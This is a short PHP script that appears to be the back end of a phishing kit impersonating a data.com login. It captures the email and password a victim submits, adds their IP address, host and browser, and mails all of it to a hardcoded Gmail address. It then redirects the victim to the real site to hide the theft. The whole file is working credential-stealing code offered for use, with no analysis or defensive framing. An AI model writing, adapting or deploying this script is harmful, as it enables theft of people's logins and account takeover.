<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- D4T4.C0NN3CT -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "Email Adresse       : ".$_POST['cmd']."\n";
$message .= "Password          : ".$_POST['password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY SOLORO ----------------------\n";
$subject = "Rezults DATA.CONN3Ct ";
$send = "rachidsoloro@gmail.com";
$headers = 'From: wewor-wewor@gmail.com' . "\r\n" .
mail($send,$subject,$message,$headers);

header("Location: https://connect.data.com");?>